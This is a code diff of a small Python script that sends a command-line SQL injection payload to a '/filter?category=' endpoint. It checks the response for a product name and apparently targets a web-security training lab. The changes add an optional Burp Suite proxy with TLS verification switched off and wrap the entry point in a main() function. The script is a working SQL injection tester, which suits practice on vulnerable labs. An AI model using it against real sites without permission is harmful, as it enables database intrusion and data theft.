@@ -4,7 +4,10 @@ import urllib3
 
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}
+
+# if u want to use burp suite as proxy to see all requests. Default on.
+use_proxy = True
+proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
 def exploit_sql_injection(url: str, payload: str) -> bool:
@@ -15,13 +18,22 @@ def exploit_sql_injection(url: str, payload: str) -> bool:
     :return: True if successful, False otherwise
     """
     uri = "/filter?category="
-    r = requests.get(url + uri + payload, verify=False, proxies=proxy)
-    if "Sarcastic 9 Ball" in r.text:
+    if use_proxy:
+        request_to_server = requests.get(
+            url + uri + payload, verify=False, proxies=proxy
+        )
+    else:
+        request_to_server = requests.get(url + uri + payload)
+    if "Sarcastic 9 Ball" in request_to_server.text:
         return True
     return False
 
 
-if __name__ == "__main__":
+def main() -> None:
+    """
+    Main function
+    :return: None
+    """
     try:
         url = sys.argv[1].strip()
         payload = sys.argv[2].strip()
@@ -34,3 +46,7 @@ if __name__ == "__main__":
         print("[+] SQL injections successful")
     else:
         print("[-] SQL injections unsuccessful")
+
+
+if __name__ == "__main__":
+    main()
